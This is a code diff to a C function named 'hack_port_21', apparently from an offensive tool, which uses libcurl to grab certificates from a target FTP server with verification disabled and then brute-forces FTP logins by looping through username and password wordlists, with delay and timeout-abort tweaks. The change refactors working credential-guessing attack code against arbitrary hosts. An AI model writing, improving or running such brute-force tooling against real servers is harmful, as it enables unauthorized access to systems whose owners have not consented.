@@ -35,33 +35,10 @@ int hack_port_21(in_addr_t ip, int port){
 	printf("%s", HBLUE);
 	printf("\nTrying to obtain certs...\n\n");
 	printf("%s",BLUE);
-	CURL *mCurl2 = curl_easy_init();
+	curl_global_init(CURL_GLOBAL_ALL);
 	char url[50]="";
 	snprintf(url,sizeof(url),"ftp://%s/",inet_ntoa(*((struct in_addr*)&dest_ip.s_addr)));
-	if(mCurl2) {
-		curl_easy_setopt(mCurl2, CURLOPT_URL, url);
-		curl_easy_setopt(mCurl2, CURLOPT_SSL_VERIFYPEER, 0L);
-		curl_easy_setopt(mCurl2, CURLOPT_SSL_VERIFYHOST, 0L);
-		curl_easy_setopt(mCurl2, CURLOPT_CERTINFO, 1L);
-		int res = curl_easy_perform(mCurl2);
-		if (!res) {
-			struct curl_certinfo *ci;
-			res = curl_easy_getinfo(mCurl2, CURLINFO_CERTINFO, &ci);
-			if (!res) {
-				printf("%d certs!\n", ci->num_of_certs);
-				for(int i = 0; i < ci->num_of_certs; i++) {
-					struct curl_slist *slist;
-					for(slist = ci->certinfo[i]; slist; slist = slist->next)
-						printf("%s\n", slist->data);
-				}
-			}else{
-				printf("%s\n",curl_easy_strerror(res));
-			}
-		}else{
-			printf("%s\n",curl_easy_strerror(res));
-		}
-		curl_easy_cleanup(mCurl2);
-	}
+	cert_grabbing(url);
 	// Brute Force Attack
 	printf("%s", HBLUE);
 	printf("\nTrying to perform connections by using brute force...\n\n");
@@ -89,17 +66,16 @@ int hack_port_21(in_addr_t ip, int port){
 	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
 	totalComb=totalUsernames*totalPasswords;
 	int abort=FALSE;
-	curl_global_init(CURL_GLOBAL_ALL);
-	CURLcode res;
 	char *ftpEntryPath=NULL;
 	struct memory chunk = {0};
+	CURLcode res;
 	CURL *mCurl=curl_easy_init();
 	if (mCurl){
-		for(i=0;i<totalUsernames && abort==FALSE;i++){
-			for(int j=0;j<totalPasswords && abort==FALSE;j++,cont++){
+		for(i=0;i<totalUsernames && timeouts<BRUTE_FORCE_TIMEOUT && abort==FALSE;i++){
+			for(int j=0;j<totalPasswords && timeouts<BRUTE_FORCE_TIMEOUT && abort==FALSE;j++,cont++){
 				printf("\rPercentaje completed: %.4lf%% (%s/%s)               ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
 				fflush(stdout);
-				usleep(CURL_PERFORM_DELAY);
+				usleep(BRUTE_FORCE_DELAY);
 				curl_easy_setopt(mCurl, CURLOPT_URL, url);
 				curl_easy_setopt(mCurl, CURLOPT_WRITEFUNCTION, callback);
 				curl_easy_setopt(mCurl, CURLOPT_WRITEDATA, (void *)&chunk);
@@ -122,12 +98,6 @@ int hack_port_21(in_addr_t ip, int port){
 						break;
 					case 28:
 						timeouts++;
-						if(timeouts==BRUTE_FORCE_TIMEOUT){
-							printf("\nThird timeout. Aborting...\n");
-							abort=TRUE;
-							break;
-						}
-						printf("\nFirst timeout...\n");
 						break;
 					default:
 						printf("libcurl error: %d (%s)\n", res,curl_easy_strerror(res));
@@ -140,6 +110,7 @@ int hack_port_21(in_addr_t ip, int port){
 	}else{
 		printf("Error curl initialization\n");
 	}
+	if(timeouts==3) printf("\n\nBrute Force hacking aborted by timeouting");
 	curl_easy_cleanup(mCurl);
 	curl_global_cleanup();
 	printf("\n");
